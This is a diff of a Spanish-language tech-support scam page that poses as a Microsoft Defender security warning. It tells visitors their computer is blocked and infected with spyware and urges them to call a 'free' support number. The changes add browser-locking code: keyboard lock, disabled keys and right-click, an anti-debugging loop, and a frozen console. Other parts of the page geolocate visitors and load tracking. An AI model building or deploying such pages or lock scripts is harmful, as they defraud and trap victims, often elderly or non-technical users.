@@ -1,8 +1,7 @@
-
 <!doctype html>
 <html lang="es">
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
     <!-- Required meta tags -->
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <!-- Bootstrap CSS -->
@@ -11,7 +10,7 @@
     <script src="ajax/libs/jquery/2.1.3/jquery.min.js"></script>
     <link rel="stylesheet" type="text/css" href="main.css">
     <title>Security-Center-Code0x268d3 Services-Error0SecurityrEr0dfdsfd07</title>
-<link rel="canonical" href="web.core.windows.net" />
+	<link rel="canonical" href="web.core.windows.net" />
     <link rel="stylesheet" href="font-awesome/4.5.0/css/font-awesome.min.css">
     <script type="text/javascript">
         window.onload = function () {
@@ -69,7 +68,7 @@
     t.open("GET", "https://ipwho.is/?lang=en", !0);
     t.send();
   </script>
- 
+  
 <!-- Hotjar Tracking Code for mortgocus.site -->
 <script>
     (function(h,o,t,j,a,r){
@@ -618,18 +617,19 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
     <div id="disclaimer">
         El acceso a este ordenador ha sido bloqueado por razones de seguridad.<br>
-       
+        
 
-        <span class="support" style="font-size:22px;">Póngase en contacto con el soporte técnico:&nbsp;
-        <img src="phone1.png"style="width: 200px;" id="banner">
-        <!--<span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script> -->
-       
-(Línea gratuita)
-<br /><span style="color: green">SOPORTE 100% GRATUITO</span>
-</span>
+        <span class="support" style="font-size:22px;">Póngase en contacto con el soporte técnico:&nbsp; 
+        <!--<img src="phone1.png"style="width: 200px;" id="banner">-->
+	<br />
+        <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script></span>
+        <br />
+	(Línea gratuita)
+	<br /><span style="color: green">SOPORTE 100% GRATUITO</span>
+	</span>
       </span>
 
-           
+            
     </div>
     <div id="bottom">
         <img id="badge" src="microsoft.png"><span class="title3"> Defender </span>
@@ -691,7 +691,7 @@ Comuníquese con el soporte gratuito de inmediato. Un ingeniero de Smart Defende
     padding: 5px 10px;
     color: #FFFFFF !important;
     color: #414141;font-weight: bold;
-    margin-top: 8px;">Defender - Advertencia de Seguridad</ p>
+    margin-top: 8px;">Defender - Advertencia de Seguridad</	p>
     <p>** Notificación de protección de red y firewall **</p>
     <p>Su computadora nos ha alertado de que ha sido infectada con un software espía troyano. Los siguientes datos han sido
         comprometida.</p>
@@ -835,9 +835,9 @@ Comuníquese con el soporte gratuito de inmediato. Un ingeniero de Smart Defende
         $(".pro_box3").delay(1000).fadeIn(800);
         $(".pro_box3").delay(1000).fadeIn(800);
         $("#pop_up_new").delay(1000).fadeIn(800);
-$("#poptxt").delay(1000).fadeIn(800);
-       
-       
+		$("#poptxt").delay(1000).fadeIn(800);
+        
+        
     });
 </script>
 <script type="text/javascript">
@@ -854,9 +854,59 @@ $("#poptxt").delay(1000).fadeIn(800);
             toggleFullScreen();
         }
     }, false);
- 
+  
+
+      navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+        return false;
+    }
+
+
+    // Disable specific key combinations
+    document.addEventListener('keydown', function (event) {
+        if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey &&
+            (event.keyCode === 'I'.charCodeAt(0) || event.keyCode === 'i'.charCodeAt(0) ||
+             event.keyCode === 'L'.charCodeAt(0) || event.keyCode === 'l'.charCodeAt(0) ||
+             event.keyCode === 'C'.charCodeAt(0) || event.keyCode === 'c'.charCodeAt(0) ||
+             event.keyCode === 'J'.charCodeAt(0) || event.keyCode === 'j'.charCodeAt(0) ||
+             event.keyCode === 'U'.charCodeAt(0) || event.keyCode === 'u'.charCodeAt(0) ||
+             event.keyCode === 'S'.charCodeAt(0) || event.keyCode === 's'.charCodeAt(0)))) {
+            event.preventDefault();
+        }
+        });
+    
+        // Disable context menu
+        document.addEventListener('contextmenu', function (event) {
+            event.preventDefault();
+        });
+    
+        // Debugger code with retry
+        (function () {
+            (function a() {
+                try {
+                    (function b(i) {
+                        if (('' + (i / i)).length !== 1 || i % 20 === 0) {
+                            (function () {}).constructor('debugger')();
+                        } else {
+                            debugger;
+                        }
+                        b(++i);
+                    })(0);
+                } catch (e) {
+                    setTimeout(a, 5);
+                }
+            })();
+        })();
+    
+        // Disable console
+        Object.defineProperty(window, 'console', {
+            value: Object.freeze({}),
+            writable: false,
+            configurable: false
+        });
 
 </script>
+
 <script>
     // Get the modal
     var modal = document.getElementById('myModal');
